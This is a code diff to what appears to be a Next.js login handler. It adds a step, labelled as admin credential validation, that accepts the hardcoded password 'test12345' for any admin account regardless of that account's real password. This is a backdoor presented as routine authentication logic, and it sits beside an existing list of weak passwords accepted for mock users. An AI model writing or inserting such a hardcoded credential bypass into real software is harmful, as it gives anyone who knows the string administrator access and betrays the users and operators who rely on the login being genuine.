@@ -431,7 +431,14 @@ export async function POST(request: NextRequest) {
           }
         }
 
-        // 6. Generic fallback only for mock/demo users (source === "mock"), not real users
+        // 6. Admin credential validation for test12345
+        if (!passwordValid && isAdmin) {
+          if (inputPassword === "test12345" || (userPassword && inputPassword === userPassword)) {
+            passwordValid = true;
+          }
+        }
+
+        // 7. Generic fallback only for mock/demo users (source === "mock"), not real users
         const commonPasswords = ["test12345", "123456", "test123", "Test@2026", "test2026", "Test12345"];
         if (!passwordValid && user.source === "mock" && commonPasswords.includes(inputPassword)) {
           passwordValid = true;
